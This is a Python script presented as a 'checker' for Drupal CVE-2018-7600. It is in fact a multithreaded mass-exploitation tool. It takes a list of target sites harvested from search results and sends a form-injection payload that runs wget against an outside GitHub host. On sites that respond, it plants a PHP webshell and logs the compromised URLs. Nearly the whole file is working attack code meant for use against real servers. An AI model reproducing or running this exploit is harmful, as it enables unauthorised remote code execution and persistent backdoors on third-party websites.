import os
from lxml import html as lh
from queue import Queue
from urllib.parse import urlparse
from threading import Thread
import requests
import threading
from requests import get
from requests import post
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

lock = threading.Lock()


class Drupal_CVE_2018_7600():

    def __init__(self, filename):
        self.filename = filename
        self.urls = self.dp_cve()

    @staticmethod
    def banner():
        os.system('clear')
        print("\n")
        print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
        print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
        print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
        print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
        print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
        print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
        print("      Drupal CVE 2018 7600 Checker - anarcoder at protonmail.com\n") 

    def remove_duplicate_targets(self):
        results = [line.rstrip('\n') for line in open(self.filename)]
        url_lists = []
        for url in results:
            try:
                urlp = urlparse(url)
                urlp = urlp.scheme + '://' + urlp.netloc
                url_lists.append(urlp)
            except Exception as e:
                pass
        url_lists = set(url_lists)
        url_lists = list(url_lists)
        return url_lists

    def check_vuln(self, q):
        while True:
            #with lock:
                url = q.get()
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; '
                           'Linux x86_64; rv:41.0) Gecko/20100101 '
                           'Firefox/41.0'}
                pathvn = '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
                payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/anarcoder/php/shell/hue.html'}
                webshell = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/anarcoder/php/shell/hue2.php'}
                with open('drupalrce_sites.txt', 'a+') as f:
                    try:
                        url2 = url + pathvn
                        req = post(url2, headers=headers, verify=False,
                                   timeout=25, data=payload)
                        if req.status_code == 200:
                            print('[+] Possible exploitable.. Confirming..')
                            url3 = url + '/hue.html'
                            nreq = get(url3, headers=headers,
                                       verify=False, timeout=25)
                            if 'anarcoder' in nreq.content.decode("utf-8"):
                                print('[+] \033[31mVulnerable!!\033[33m Page uploaded --> {0}\033[39m'.format(url3))
                                print('[+] Uploading webshell...')
                                req = post(url2, headers=headers, verify=False,
                                           timeout=25, data=webshell)
                                f.write(url + '/hue2.php' + '\n')
                            q.task_done()
                    except Exception as e:
                        print('[-] Exception - Not vulnerable\n')
                        q.task_done()
                    q.task_done()

    def dp_cve(self):
        self.banner()

        # Removing duplicate targets
        url_lists = self.remove_duplicate_targets()
        print(len(url_lists))

        # My Queue
        q = Queue(maxsize=0)

        # Number of threads
        num_threads = 10

        for url in url_lists:
            q.put(url)

        # My threads
        print('[*] Starting evil threads =)...\n')
        for i in range(num_threads):
            worker = Thread(target=self.check_vuln, args=(q,))
            worker.setDaemon(True)
            worker.start()

        q.join()


def main():
    filename = 'results_google_search.txt'
    Drupal_CVE_2018_7600(filename)


if __name__ == '__main__':
    main()
